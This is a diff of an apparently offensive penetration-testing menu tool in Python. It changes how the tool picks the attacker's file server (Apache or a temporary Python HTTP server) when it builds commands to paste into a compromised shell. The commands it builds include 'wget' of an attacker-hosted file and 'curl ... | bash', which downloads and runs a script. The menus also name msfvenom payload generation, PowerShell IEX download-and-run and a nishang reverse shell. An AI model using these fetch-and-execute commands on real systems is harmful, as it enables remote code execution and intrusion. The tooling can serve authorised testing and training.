@@ -81,12 +81,7 @@ def get_apache_file(pattern):
 
 def get_temp_python_file(pattern):
     ip = get_interface_ip()
-    cmd = "ps -ef | grep http.server | grep -v grep"
-    output = os.popen(cmd).read()
-    items = list(map(lambda x: x.strip('\n'), filter(lambda x: len(x) > 0, output.split(' '))))
-    print(items)
-    port = items[-1]
-    pid = items[1]
+    pid, port = select_python_http()
     if pattern == '':
         cmd = f"ls /proc/{pid}/cwd"
     else:
@@ -155,13 +150,22 @@ def linux_menu():
     if index == 0:
         stabilize_shell()
     elif index == 1 or index == 2:
+        useApache = True
+        if is_python_http_running(): useApache = choose_apache_or_python()
+
         ip = get_interface_ip()
-        if index == 1:
-            file = get_apache_file('')
-            cmd = f"wget {ip}/{file}"
-        elif index == 2:
-            file = get_apache_file('.sh')
-            cmd = f"curl {ip}/{file} | bash"
+        if index == 1: # wget a file
+            if useApache: 
+                file = get_apache_file('')
+                url = f"{ip}/{file}"
+            else: url = get_temp_python_file('')
+            cmd = f"wget {url}"
+        elif index == 2: # curl file and pipe to bash
+            if useApache:
+                file = get_apache_file('.sh')
+                url = f"{ip}/{file}"
+            else: url = get_temp_python_file('.sh')
+            cmd = f"curl {url} | bash"
         copy_to_pane(cmd)
 
 def choose_apache_or_python():
@@ -282,6 +286,7 @@ def msfvenom_menu():
         pid, _ = select_python_http()
         directory = f"/proc/{pid}/cwd/"
     msfvenom_generate_menu(ip, directory)
+    main() # call the main menu after msfvenom generation
 
 def windows_menu():
     options = ["wget outfile", "IEX download and run script", "Prepare nishang reverse shell"]
